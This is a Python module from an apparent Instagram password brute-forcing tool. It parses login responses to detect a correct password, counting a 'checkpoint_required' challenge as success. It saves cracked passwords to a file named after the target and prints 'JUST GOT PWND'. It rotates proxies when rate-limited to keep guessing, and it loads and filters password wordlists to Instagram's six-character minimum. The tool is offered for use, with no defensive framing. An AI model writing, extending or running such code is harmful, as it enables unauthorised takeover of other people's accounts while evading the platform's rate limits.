import builtins
import datetime
import json
import os
import sys
import requests
from playsound import playsound
import rich.progress

from Printf import printf
from proxy import proxy
from Timer import timer
from errors import over_requesting_msg
from utils import percentage
from vars import proxies, proxy_controlPort, options, retry_passwords, wls, passwords
def get_date():
    return str(datetime.datetime.now().strftime("%Y/%m/%d %I:%M:%S %p"))
class Analyze:
    def response(self, password:str, response:requests.Response, pid:str):
        def found():
            if options["sound"]:
                try:
                    playsound(options["sound"])
                except Exception:
                    pass
            with open(f"{options['target']}.password", "a") as target_password_found:
                target_password_found.write(f"{options['target']} => '{password}'\n")
            target_password_found.close()
            sys.exit(f"*** {options['target']} JUST GOT PWND ***")
        # 200 ok or (400 bad request when there is a challenge)
        # EX: {"message":"checkpoint_required","checkpoint_url":"/challenge/action/************/************/","lock":false,"flow_render_type":0,"status":"fail"}
        if response.status_code in [200, 400]:
            resp_json = json.loads(response.text)
            if "authenticated" in resp_json:
                if resp_json['authenticated']: # == True
                    printf(f"Found: [{get_date()}] - {options['target']} => '{password}' - [{response.status_code} {response.reason}]", mt="success")
                    found()
                    return True
            elif "message" in resp_json:
                if resp_json['message'] == "checkpoint_required":
                    printf(f"Authenticate: [{get_date()}] - {options['target']} => '{password}' - [{response.status_code} {response.reason}]", mt="auth")
                    found()
                    return True
                else:
                    return False
        else:
            resp_json = json.loads(response.text)
            if "status" in resp_json:
                if resp_json["status"] == "fail":
                    if not password in retry_passwords:
                        retry_passwords.append(password)
                    proxy.new(proxy_data=proxies[pid], controlPort=proxy_controlPort)
                    if resp_json["message"] == over_requesting_msg:
                        printf(f"[{get_date()}] - {over_requesting_msg}", mt="warn")
                    return None
            elif "errors" in resp_json:
                if not password in retry_passwords:
                    retry_passwords.append(password)
                proxy.new(proxy_data=proxies[pid], controlPort=proxy_controlPort)
                return None

    def passwords(self, file):
        lt6 = 0  # lt6=less than 6 (the shortest possible instagram password)
        unique = 0
        duplicates = 0
        analyze_timer = timer
        analyze_timer.start()  # not important but to avoid wrong estimated time.

        passwords.clear()

        # try:
        with rich.progress.open(file, "r", errors="ignore") as w:
            pswds = w.readlines()
            total = len(pswds)
            for p in pswds:  # p=password
                p = p.strip().replace(" ", "")
                if p not in passwords:
                    if len(p) >= 6:
                        unique += 1
                        passwords.append(p)
                    else:
                        lt6 += 1
                else:
                    duplicates += 1
                done = (unique + duplicates + lt6)
                w.close()
            # print()
            builtins.print(f"[{list(wls.keys()).index(file) + 1}/{len(wls)}] - [{os.path.split(file)[-1]}] - {done}/{total} - {percentage(a=total, p=done)} - short: {lt6} - unique: {unique} - duplicates: {duplicates} - {analyze_timer.get()}")
        # except Exception as error:
        #     print(error)
        #     printf("Error: '%s' couldn't be analyzed." % os.path.split(file)[-1], mt="error")
        printf("Success: done analyzing '%s'" % file, mt="success")
analyzer = Analyze()